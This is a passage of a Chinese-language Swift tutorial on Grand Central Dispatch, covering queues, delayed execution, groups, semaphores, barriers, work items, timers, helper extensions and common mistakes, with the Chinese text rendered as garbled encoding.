â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  GCD é«˜çº§ç‰¹æ€§                                    â”‚
â”‚  â”œâ”€ DispatchGroupï¼šä»»åŠ¡ç»„ç®¡ç†                   â”‚
â”‚  â”œâ”€ DispatchSemaphoreï¼šä¿¡å·é‡æ§åˆ¶                â”‚
â”‚  â”œâ”€ DispatchBarrierï¼šæ …æ ä»»åŠ¡                   â”‚
â”‚  â”œâ”€ DispatchSourceï¼šäº‹ä»¶æº                      â”‚
â”‚  â””â”€ DispatchWorkItemï¼šä»»åŠ¡å°è£…                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h3 data-id="heading-2">ä¸€ã€GCD å¸¸ç”¨æ–¹æ³•é€ŸæŸ¥è¡¨</h3>
<h4 data-id="heading-3">ğŸ“‹ æœ€å¸¸ç”¨çš„ GCD æ–¹æ³•</h4>
<h5 data-id="heading-4">1. é˜Ÿåˆ—åˆ›å»ºå’Œè·å–</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä¸²è¡Œé˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"com.example.serial"</span>)

<span class="hljs-comment">// åˆ›å»ºå¹¶è¡Œé˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> concurrentQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(
    label: <span class="hljs-string">"com.example.concurrent"</span>,
    attributes: .concurrent
)

<span class="hljs-comment">// è·å–ä¸»é˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> mainQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.main

<span class="hljs-comment">// è·å–å…¨å±€é˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> globalQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global()
<span class="hljs-keyword">let</span> highPriorityQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global(qos: .userInteractive)
<span class="hljs-keyword">let</span> backgroundQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global(qos: .background)
</code></pre>
<h5 data-id="heading-5">2. ä»»åŠ¡æäº¤ï¼ˆæœ€å¸¸ç”¨ï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å¼‚æ­¥æ‰§è¡Œï¼ˆæ¨èï¼Œæœ€å¸¸ç”¨ï¼‰</span>
queue.async {
    <span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¼‚æ­¥æ‰§è¡Œ"</span>)
}

<span class="hljs-comment">// åŒæ­¥æ‰§è¡Œï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</span>
queue.sync {
    <span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŒæ­¥æ‰§è¡Œ"</span>)
}

<span class="hljs-comment">// å¼‚æ­¥æ‰§è¡Œï¼ŒæŒ‡å®šé˜Ÿåˆ—</span>
<span class="hljs-type">DispatchQueue</span>.main.async {
    <span class="hljs-comment">// UI æ›´æ–°</span>
    <span class="hljs-keyword">self</span>.label.text <span class="hljs-operator">=</span> <span class="hljs-string">"æ›´æ–°"</span>
}

<span class="hljs-comment">// åå°æ‰§è¡Œ</span>
<span class="hljs-type">DispatchQueue</span>.global().async {
    <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
    processData()
}
</code></pre>
<h5 data-id="heading-6">3. å»¶è¿Ÿæ‰§è¡Œ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œï¼ˆæœ€å¸¸ç”¨ï¼‰</span>
<span class="hljs-type">DispatchQueue</span>.main.asyncAfter(deadline: .now() <span class="hljs-operator">+</span> <span class="hljs-number">2.0</span>) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"2ç§’åæ‰§è¡Œ"</span>)
}

<span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œï¼ŒæŒ‡å®šæ—¶é—´</span>
<span class="hljs-keyword">let</span> delay <span class="hljs-operator">=</span> <span class="hljs-type">DispatchTime</span>.now() <span class="hljs-operator">+</span> <span class="hljs-type">DispatchTimeInterval</span>.seconds(<span class="hljs-number">3</span>)
<span class="hljs-type">DispatchQueue</span>.main.asyncAfter(deadline: delay) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"3ç§’åæ‰§è¡Œ"</span>)
}

<span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œï¼Œåå°é˜Ÿåˆ—</span>
<span class="hljs-type">DispatchQueue</span>.global().asyncAfter(deadline: .now() <span class="hljs-operator">+</span> <span class="hljs-number">1.0</span>) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"1ç§’åæ‰§è¡Œ"</span>)
}
</code></pre>
<h5 data-id="heading-7">4. ä»»åŠ¡ç»„ï¼ˆDispatchGroupï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä»»åŠ¡ç»„</span>
<span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()

<span class="hljs-comment">// è¿›å…¥ç»„</span>
group.enter()

<span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
queue.async {
    <span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
    group.leave()  <span class="hljs-comment">// ç¦»å¼€ç»„</span>
}

<span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span>
group.wait()  <span class="hljs-comment">// é˜»å¡ç­‰å¾…</span>

<span class="hljs-comment">// æ‰€æœ‰ä»»åŠ¡å®Œæˆåçš„å›è°ƒï¼ˆæœ€å¸¸ç”¨ï¼‰</span>
group.notify(queue: .main) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰ä»»åŠ¡å®Œæˆ"</span>)
}
</code></pre>
<h5 data-id="heading-8">5. ä¿¡å·é‡ï¼ˆDispatchSemaphoreï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä¿¡å·é‡ï¼ˆåˆå§‹å€¼ = æœ€å¤§å¹¶å‘æ•°ï¼‰</span>
<span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">3</span>)

<span class="hljs-comment">// ç­‰å¾…ä¿¡å·é‡</span>
semaphore.wait()

<span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
queue.async {
    <span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
    semaphore.signal()  <span class="hljs-comment">// é‡Šæ”¾ä¿¡å·é‡</span>
}
</code></pre>
<h5 data-id="heading-9">6. æ …æ ä»»åŠ¡ï¼ˆDispatchBarrierï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// æ …æ ä»»åŠ¡ï¼ˆåœ¨å¹¶è¡Œé˜Ÿåˆ—ä¸­ä½¿ç”¨ï¼‰</span>
concurrentQueue.async(flags: .barrier) {
    <span class="hljs-comment">// è¿™ä¸ªä»»åŠ¡ä¼šç­‰å¾…å‰é¢çš„ä»»åŠ¡å®Œæˆ</span>
    <span class="hljs-comment">// æ‰§è¡Œæ—¶é˜»å¡å…¶ä»–ä»»åŠ¡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ …æ ä»»åŠ¡"</span>)
}
</code></pre>
<h5 data-id="heading-10">7. ä¸€æ¬¡æ€§æ‰§è¡Œï¼ˆDispatchOnceï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// Swift ä¸­æ¨èä½¿ç”¨é™æ€å±æ€§å®ç°å•ä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> shared <span class="hljs-operator">=</span> <span class="hljs-type">MyClass</span>()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">init</span>() {}
}

<span class="hljs-comment">// Objective-C ä¸­ä½¿ç”¨ dispatch_once</span>
<span class="hljs-keyword">static</span> dispatch_once_t onceToken;
dispatch_once(<span class="hljs-operator">&amp;</span>onceToken, <span class="hljs-operator">^</span>{
    <span class="hljs-comment">// åªæ‰§è¡Œä¸€æ¬¡çš„ä»£ç </span>
});
</code></pre>
<h5 data-id="heading-11">8. ä»»åŠ¡å°è£…ï¼ˆDispatchWorkItemï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä»»åŠ¡</span>
<span class="hljs-keyword">let</span> workItem <span class="hljs-operator">=</span> <span class="hljs-type">DispatchWorkItem</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>)
}

<span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
queue.async(execute: workItem)

<span class="hljs-comment">// ç­‰å¾…ä»»åŠ¡å®Œæˆ</span>
workItem.wait()

<span class="hljs-comment">// å–æ¶ˆä»»åŠ¡</span>
workItem.cancel()

<span class="hljs-comment">// ä»»åŠ¡å®Œæˆé€šçŸ¥</span>
workItem.notify(queue: .main) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>)
}
</code></pre>
<h5 data-id="heading-12">9. å®šæ—¶å™¨ï¼ˆDispatchSourceTimerï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºå®šæ—¶å™¨</span>
<span class="hljs-keyword">let</span> timer <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSource</span>.makeTimerSource(queue: .global())

<span class="hljs-comment">// è®¾ç½®å®šæ—¶å™¨ï¼ˆç«‹å³å¼€å§‹ï¼Œæ¯ç§’é‡å¤ï¼‰</span>
timer.schedule(deadline: .now(), repeating: <span class="hljs-number">1.0</span>)

<span class="hljs-comment">// è®¾ç½®äº‹ä»¶å¤„ç†</span>
timer.setEventHandler {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®šæ—¶å™¨è§¦å‘"</span>)
}

<span class="hljs-comment">// å¯åŠ¨å®šæ—¶å™¨</span>
timer.resume()

<span class="hljs-comment">// å–æ¶ˆå®šæ—¶å™¨</span>
timer.cancel()
</code></pre>
<hr/>
<h4 data-id="heading-13">ğŸ¯ æœ€å¸¸ç”¨çš„ 10 ä¸ªæ–¹æ³•ï¼ˆæŒ‰ä½¿ç”¨é¢‘ç‡ï¼‰</h4>







































































<table><thead><tr><th>æ’å</th><th>æ–¹æ³•</th><th>ä½¿ç”¨åœºæ™¯</th><th>ä»£ç ç¤ºä¾‹</th></tr></thead><tbody><tr><td>1</td><td><code>DispatchQueue.main.async</code></td><td>UI æ›´æ–°</td><td><code>DispatchQueue.main.async { self.label.text = "æ›´æ–°" }</code></td></tr><tr><td>2</td><td><code>DispatchQueue.global().async</code></td><td>åå°ä»»åŠ¡</td><td><code>DispatchQueue.global().async { processData() }</code></td></tr><tr><td>3</td><td><code>DispatchQueue.main.asyncAfter</code></td><td>å»¶è¿Ÿæ‰§è¡Œ</td><td><code>DispatchQueue.main.asyncAfter(deadline: .now() + 2) { }</code></td></tr><tr><td>4</td><td><code>DispatchGroup.notify</code></td><td>ç­‰å¾…å¤šä¸ªä»»åŠ¡</td><td><code>group.notify(queue: .main) { }</code></td></tr><tr><td>5</td><td><code>DispatchQueue(label:)</code></td><td>åˆ›å»ºé˜Ÿåˆ—</td><td><code>let queue = DispatchQueue(label: "com.example")</code></td></tr><tr><td>6</td><td><code>DispatchSemaphore</code></td><td>æ§åˆ¶å¹¶å‘</td><td><code>let semaphore = DispatchSemaphore(value: 3)</code></td></tr><tr><td>7</td><td><code>DispatchGroup.enter/leave</code></td><td>ä»»åŠ¡ç»„ç®¡ç†</td><td><code>group.enter()</code> ... <code>group.leave()</code></td></tr><tr><td>8</td><td><code>queue.async(flags: .barrier)</code></td><td>è¯»å†™é”</td><td><code>queue.async(flags: .barrier) { }</code></td></tr><tr><td>9</td><td><code>DispatchWorkItem</code></td><td>ä»»åŠ¡å°è£…</td><td><code>let workItem = DispatchWorkItem { }</code></td></tr><tr><td>10</td><td><code>DispatchSource.makeTimerSource</code></td><td>å®šæ—¶å™¨</td><td><code>let timer = DispatchSource.makeTimerSource()</code></td></tr></tbody></table>
<hr/>
<h4 data-id="heading-14">ğŸ’¡ å¸¸ç”¨æ–¹æ³•ç»„åˆæ¨¡å¼</h4>
<h5 data-id="heading-15">æ¨¡å¼1ï¼šåå°å¤„ç† + ä¸»çº¿ç¨‹æ›´æ–°ï¼ˆæœ€å¸¸ç”¨ï¼‰</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">DispatchQueue</span>.global().async {
    <span class="hljs-comment">// åå°å¤„ç†</span>
    <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> processData()
    
    <span class="hljs-type">DispatchQueue</span>.main.async {
        <span class="hljs-comment">// ä¸»çº¿ç¨‹æ›´æ–° UI</span>
        <span class="hljs-keyword">self</span>.updateUI(with: data)
    }
}
</code></pre>
<h5 data-id="heading-16">æ¨¡å¼2ï¼šå¤šä¸ªä»»åŠ¡å®Œæˆåæ›´æ–°</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()

group.enter()
fetchData1 { group.leave() }

group.enter()
fetchData2 { group.leave() }

group.notify(queue: .main) {
    <span class="hljs-comment">// æ‰€æœ‰ä»»åŠ¡å®Œæˆï¼Œæ›´æ–° UI</span>
    <span class="hljs-keyword">self</span>.updateUI()
}
</code></pre>
<h5 data-id="heading-17">æ¨¡å¼3ï¼šæ§åˆ¶å¹¶å‘æ•°é‡</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">3</span>)

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls {
    semaphore.wait()
    <span class="hljs-type">DispatchQueue</span>.global().async {
        download(url) {
            semaphore.signal()
        }
    }
}
</code></pre>
<h5 data-id="heading-18">æ¨¡å¼4ï¼šå»¶è¿Ÿæ‰§è¡Œ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å»¶è¿Ÿ 2 ç§’æ‰§è¡Œ</span>
<span class="hljs-type">DispatchQueue</span>.main.asyncAfter(deadline: .now() <span class="hljs-operator">+</span> <span class="hljs-number">2.0</span>) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"2ç§’åæ‰§è¡Œ"</span>)
}
</code></pre>
<h5 data-id="heading-19">æ¨¡å¼5ï¼šè¯»å†™é”</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"cache"</span>, attributes: .concurrent)

<span class="hljs-comment">// è¯»æ“ä½œï¼šå¹¶å‘æ‰§è¡Œ</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">read</span>() -&gt; <span class="hljs-type">Data</span>? {
    <span class="hljs-keyword">return</span> queue.sync { cache[key] }
}

<span class="hljs-comment">// å†™æ“ä½œï¼šæ …æ ä»»åŠ¡</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">write</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) {
    queue.async(flags: .barrier) {
        cache[key] <span class="hljs-operator">=</span> data
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-20">ğŸ”§ å®ç”¨å·¥å…·æ–¹æ³•å°è£…</h4>
<h5 data-id="heading-21">1. å»¶è¿Ÿæ‰§è¡Œå·¥å…·æ–¹æ³•</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">DispatchQueue</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">delay</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">seconds</span>: <span class="hljs-type">Double</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-type">DispatchQueue</span>.main.asyncAfter(deadline: .now() <span class="hljs-operator">+</span> seconds) {
            completion()
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-type">DispatchQueue</span>.delay(<span class="hljs-number">2.0</span>) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"2ç§’åæ‰§è¡Œ"</span>)
}
</code></pre>
<h5 data-id="heading-22">2. åå°æ‰§è¡Œ + ä¸»çº¿ç¨‹å›è°ƒ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">DispatchQueue</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">background</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">work</span>: <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span>, 
                          <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-type">DispatchQueue</span>.global().async {
            work()
            <span class="hljs-type">DispatchQueue</span>.main.async {
                completion()
            }
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-type">DispatchQueue</span>.background({
    <span class="hljs-comment">// åå°å¤„ç†</span>
    processData()
}) {
    <span class="hljs-comment">// ä¸»çº¿ç¨‹å›è°ƒ</span>
    <span class="hljs-keyword">self</span>.updateUI()
}
</code></pre>
<h5 data-id="heading-23">3. å®‰å…¨çš„ä¸»çº¿ç¨‹æ‰§è¡Œ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">DispatchQueue</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">safeMain</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">work</span>: <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-keyword">if</span> <span class="hljs-type">Thread</span>.isMainThread {
            work()
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">DispatchQueue</span>.main.async {
                work()
            }
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šæ— è®ºå½“å‰åœ¨å“ªä¸ªçº¿ç¨‹ï¼Œéƒ½èƒ½å®‰å…¨åœ°åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ</span>
<span class="hljs-type">DispatchQueue</span>.safeMain {
    <span class="hljs-keyword">self</span>.label.text <span class="hljs-operator">=</span> <span class="hljs-string">"æ›´æ–°"</span>
}
</code></pre>
<h5 data-id="heading-24">4. æ‰¹é‡ä»»åŠ¡æ‰§è¡Œ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">DispatchQueue</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">executeBatch</span>&lt;<span class="hljs-type">T</span>&gt;(
        <span class="hljs-params">items</span>: [<span class="hljs-type">T</span>],
        <span class="hljs-params">maxConcurrent</span>: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>,
        <span class="hljs-params">processor</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">T</span>, <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span>) -&gt; <span class="hljs-type">Void</span>,
        <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span>
    ) {
        <span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
        <span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: maxConcurrent)
        
        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items {
            group.enter()
            semaphore.wait()
            
            <span class="hljs-type">DispatchQueue</span>.global().async {
                processor(item) {
                    semaphore.signal()
                    group.leave()
                }
            }
        }
        
        group.notify(queue: .main) {
            completion()
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-type">DispatchQueue</span>.executeBatch(
    items: imageURLs,
    maxConcurrent: <span class="hljs-number">3</span>,
    processor: { url, done <span class="hljs-keyword">in</span>
        downloadImage(url: url) {
            done()
        }
    },
    completion: {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰å›¾ç‰‡ä¸‹è½½å®Œæˆ"</span>)
    }
)
</code></pre>
<hr/>
<h4 data-id="heading-25">ğŸ“ å¸¸ç”¨æ–¹æ³•å‚æ•°è¯´æ˜</h4>
<h5 data-id="heading-26">DispatchQueue åˆå§‹åŒ–å‚æ•°</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">DispatchQueue</span>(
    label: <span class="hljs-type">String</span>,                    <span class="hljs-comment">// é˜Ÿåˆ—æ ‡è¯†ç¬¦ï¼ˆå¿…å¡«ï¼‰</span>
    qos: <span class="hljs-type">DispatchQoS</span> <span class="hljs-operator">=</span> .default,      <span class="hljs-comment">// æœåŠ¡è´¨é‡ä¼˜å…ˆçº§</span>
    attributes: <span class="hljs-type">DispatchQueue</span>.<span class="hljs-type">Attributes</span> <span class="hljs-operator">=</span> [],  <span class="hljs-comment">// é˜Ÿåˆ—å±æ€§</span>
    autoreleaseFrequency: <span class="hljs-type">DispatchQueue</span>.<span class="hljs-type">AutoreleaseFrequency</span> <span class="hljs-operator">=</span> .inherit,  <span class="hljs-comment">// è‡ªåŠ¨é‡Šæ”¾é¢‘ç‡</span>
    target: <span class="hljs-type">DispatchQueue</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>      <span class="hljs-comment">// ç›®æ ‡é˜Ÿåˆ—</span>
)

<span class="hljs-comment">// å¸¸ç”¨å±æ€§</span>
.attributes <span class="hljs-operator">=</span> []              <span class="hljs-comment">// ä¸²è¡Œé˜Ÿåˆ—ï¼ˆé»˜è®¤ï¼‰</span>
.attributes <span class="hljs-operator">=</span> .concurrent     <span class="hljs-comment">// å¹¶è¡Œé˜Ÿåˆ—</span>
</code></pre>
<h5 data-id="heading-27">QoS ä¼˜å…ˆçº§è¯´æ˜</h5>
<pre><code class="hljs language-swift" lang="swift">.userInteractive    <span class="hljs-comment">// ç”¨æˆ·äº¤äº’ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰</span>
.userInitiated      <span class="hljs-comment">// ç”¨æˆ·å‘èµ·</span>
.default            <span class="hljs-comment">// é»˜è®¤</span>
.utility            <span class="hljs-comment">// å®ç”¨å·¥å…·</span>
.background         <span class="hljs-comment">// åå°ï¼ˆæœ€ä½ä¼˜å…ˆçº§ï¼‰</span>
.unspecified        <span class="hljs-comment">// æœªæŒ‡å®š</span>
</code></pre>
<h5 data-id="heading-28">asyncAfter å‚æ•°è¯´æ˜</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">asyncAfter</span>(
    <span class="hljs-params">deadline</span>: <span class="hljs-type">DispatchTime</span>,           <span class="hljs-comment">// æ‰§è¡Œæ—¶é—´</span>
    <span class="hljs-params">qos</span>: <span class="hljs-type">DispatchQoS</span> <span class="hljs-operator">=</span> .unspecified, <span class="hljs-comment">// ä¼˜å…ˆçº§</span>
    <span class="hljs-params">flags</span>: <span class="hljs-type">DispatchWorkItemFlags</span> <span class="hljs-operator">=</span> [], <span class="hljs-comment">// æ ‡å¿—</span>
    <span class="hljs-params">execute</span> <span class="hljs-params">work</span>: <span class="hljs-keyword">@escaping</span> () -&gt; <span class="hljs-type">Void</span> <span class="hljs-comment">// ä»»åŠ¡</span>
)

<span class="hljs-comment">// å¸¸ç”¨æ—¶é—´è®¡ç®—</span>
.now() <span class="hljs-operator">+</span> <span class="hljs-number">2.0</span>                    <span class="hljs-comment">// 2ç§’å</span>
.now() <span class="hljs-operator">+</span> .seconds(<span class="hljs-number">3</span>)            <span class="hljs-comment">// 3ç§’å</span>
.now() <span class="hljs-operator">+</span> .milliseconds(<span class="hljs-number">500</span>)     <span class="hljs-comment">// 500æ¯«ç§’å</span>
.now() <span class="hljs-operator">+</span> .nanoseconds(<span class="hljs-number">1000000</span>)   <span class="hljs-comment">// 1æ¯«ç§’å</span>
</code></pre>
<hr/>
<h4 data-id="heading-29">âš ï¸ å¸¸è§é”™è¯¯å’Œæ³¨æ„äº‹é¡¹</h4>
<h5 data-id="heading-30">é”™è¯¯1ï¼šä¸»çº¿ç¨‹åŒæ­¥è°ƒç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šæ­»é”</span>
<span class="hljs-type">DispatchQueue</span>.main.sync {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ"</span>)
}

<span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-type">DispatchQueue</span>.main.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç ä¼šæ‰§è¡Œ"</span>)
}
</code></pre>
<h5 data-id="heading-31">é”™è¯¯2ï¼šå¾ªç¯å¼•ç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¾ªç¯å¼•ç”¨</span>
<span class="hljs-type">DispatchQueue</span>.global().async {
    <span class="hljs-keyword">self</span>.processData()  <span class="hljs-comment">// æ•è·äº† self</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ weak self</span>
<span class="hljs-type">DispatchQueue</span>.global().async { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.processData()
}
</code></pre>
<h5 data-id="heading-32">é”™è¯¯3ï¼šå¿˜è®° leave</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¿˜è®° leaveï¼Œgroup.notify æ°¸è¿œä¸ä¼šæ‰§è¡Œ</span>
<span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
group.enter()
<span class="hljs-type">DispatchQueue</span>.global().async {
    <span class="hljs-comment">// å¿˜è®° group.leave()</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šç¡®ä¿ enter å’Œ leave é…å¯¹</span>
<span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
group.enter()
<span class="hljs-type">DispatchQueue</span>.global().async {
    processData()
    group.leave()  <span class="hljs-comment">// è®°å¾— leave</span>
}
</code></pre>
<h5 data-id="heading-33">é”™è¯¯4ï¼šä¿¡å·é‡å¿˜è®° signal</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¿˜è®° signalï¼Œå…¶ä»–ä»»åŠ¡æ— æ³•æ‰§è¡Œ</span>
<span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">1</span>)
semaphore.wait()
<span class="hljs-comment">// å¿˜è®° semaphore.signal()</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ defer ç¡®ä¿é‡Šæ”¾</span>
<span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">1</span>)
semaphore.wait()
<span class="hljs-keyword">defer</span> { semaphore.signal() }
<span class="hljs-comment">// ä»»åŠ¡ä»£ç </span>
</code></pre>
<hr/>
<h3 data-id="heading-34">äºŒã€GCD åŸºç¡€æ¦‚å¿µ</h3>
<h4 data-id="heading-35">1. ä»€ä¹ˆæ˜¯ GCDï¼Ÿ</h4>
<p><strong>GCDï¼ˆGrand Central Dispatchï¼‰</strong> æ˜¯ Apple æä¾›çš„å¤šçº¿ç¨‹ç¼–ç¨‹è§£å†³æ–¹æ¡ˆï¼ŒåŸºäº C è¯­è¨€å®ç°ã€‚</p>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong></p>
<ul>
<li>å°†ä»»åŠ¡æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­</li>
<li>ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†çº¿ç¨‹çš„åˆ›å»ºå’Œè°ƒåº¦</li>
